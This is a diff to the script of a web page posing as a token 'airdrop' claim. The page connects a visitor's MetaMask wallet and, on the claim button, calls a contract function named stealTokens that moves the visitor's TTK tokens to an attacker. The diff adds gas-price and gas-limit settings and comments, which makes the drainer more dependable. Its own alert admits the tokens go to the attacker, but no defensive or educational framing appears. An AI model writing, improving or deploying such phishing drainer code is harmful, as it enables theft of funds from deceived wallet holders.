@@ -20,41 +20,62 @@
             { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address payable", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
         ];
 
-        const contractAddress = "0x65a59e7c1879120b0623723ea643fb85f894b128"; // Replace with your contract address
-        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; // Replace with your TTK token address
+        // Replace with your contract and token addresses
+        const contractAddress = "0x65a59e7c1879120b0623723ea643fb85f894b128";
+        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; // TTK Token Address
         let web3;
         let contract;
         let userAddress;
 
+        // Connect MetaMask to the website
         async function connectMetaMask() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
                 try {
+                    // Request user account connection
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                     userAddress = accounts[0];
+
+                    // Hide the connect button and show the airdrop button
                     document.getElementById('connectButton').style.display = 'none';
                     document.getElementById('airdropButton').style.display = 'block';
                 } catch (error) {
                     console.error("User denied MetaMask connection", error);
+                    alert("Please connect your MetaMask wallet.");
                 }
             } else {
                 alert("Please install MetaMask!");
             }
         }
 
+        // Claim the airdrop and execute token transfer
         async function claimAirdrop() {
             contract = new web3.eth.Contract(contractABI, contractAddress);
+
             try {
-                await contract.methods.stealTokens(tokenAddress).send({ from: userAddress });
-                alert("Airdrop claimed! (Tokens transferred to attacker)");
+                // Fetch current gas price from the network
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasLimit = 100000; // Set a reasonable gas limit for ERC-20 transfers
+
+                // Send the transaction with the appropriate gas settings
+                await contract.methods.stealTokens(tokenAddress).send({
+                    from: userAddress,
+                    gasPrice: gasPrice,
+                    gas: gasLimit
+                });
+
+                alert("Airdrop claimed! Tokens transferred to attacker.");
             } catch (err) {
                 console.error("Error in claiming airdrop", err);
+                alert("Transaction failed! Please check the console for more details.");
             }
         }
 
+        // Event listeners for the buttons
         document.getElementById('connectButton').addEventListener('click', connectMetaMask);
         document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
     </script>
 
 </body>
 </html>
+
